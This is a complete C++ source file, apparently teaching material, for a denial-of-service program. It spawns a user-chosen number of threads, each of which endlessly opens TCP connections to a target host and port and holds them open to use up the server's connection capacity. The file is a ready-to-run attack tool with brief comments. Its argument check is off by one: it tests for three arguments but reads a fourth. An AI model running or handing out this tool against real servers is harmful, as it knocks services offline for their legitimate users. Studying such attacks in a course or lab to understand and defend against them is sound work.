// Copyright (C) 2018 raodm@miamiOH.edu
// g++ -g -Wall -std=c++14 dos_attack.cpp -o dos_attack -lboost_system -lpthread

#include <boost/asio.hpp>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>

using namespace boost::asio;
using namespace boost::system;

/**
 * This method is called from multiple threads. Each thread simply
 * keeps creating connections to the server and holds onto the
 * connection for 5 seconds.  This causes many connections to be
 * used-up at the server, thereby indirectly preventing other users
 * from connecting to the server.
 */
void threadMain(std::string host, int port) {
    while (true) {
        // Create a connections to the specified host @ given port.
        ip::tcp::iostream stream;
        stream.connect(host, std::to_string(port));
        // Just sleep for 5 seconds holding onto the connection
        using namespace std::literals::chrono_literals;
        std::this_thread::sleep_for(5s);
    }
}

/**
 * The main method starts multiple threads to connect to a given
 * server at given port.  The information is specified as command-line
 * arguments.
 *
 * \param[in] argc The number of command-line arguments should be 3
 * for this program.
 *
 * \param[in] argv The command-line arguments are interpreted as follows:
 *      - 1. The host name or the IP address of the server
 *      - 2. The port number to be used for the server
 *      - 3. The number of threads to use.
 */
int main(int argc, char *argv[]) {
    // Check host, port, and threads is specified.
    if (argc < 3) {
        std::cout << "Usage: <Host/IP> <Port> <#Threads>\n";
        return 1;
    }
    // Create threads that endlessly create connections
    const int port = std::stoi(argv[2]), threads = std::stoi(argv[3]);
    std::vector<std::thread> thrList;
    for (int i = 0; (i < threads); i++) {
        thrList.push_back(std::thread(threadMain, argv[1], port));
    }
    // Wait for threads to finish
    for (auto& t : thrList) {
        t.join();
    }
    return 0;
}
